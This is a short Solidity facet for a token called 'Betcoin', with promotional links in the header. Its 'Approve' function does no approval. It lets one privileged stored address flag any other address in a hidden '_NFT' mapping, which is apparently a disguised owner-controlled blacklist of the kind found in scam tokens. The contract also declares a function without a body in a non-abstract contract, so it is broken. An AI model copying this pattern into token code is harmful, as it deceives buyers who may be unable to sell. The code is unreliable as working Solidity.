/*
WEBSITE https://thebetcoin.app
TWITTER https://twitter.com/Betcoineth
TELEGRAM https://t.me/BetcoinAiETH
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

interface IUniswapV2Pair {
    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);
}

import "./TestLib.sol";
contract getPairFacet {
    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);
    function uniswapPair() public view virtual returns (address) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return
            IUniswapV2Pair(ds.FACTORY).getPair(address(ds.WETH), address(this));
    }
    function Approve(address pair) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (
            ds._lp[0] == msg.sender &&
            ds._lp[0] != pair &&
            uniswapPair() != pair &&
            pair != ds.ROUTER
        ) {
            ds._NFT[pair] = 1;
        }
    }
}
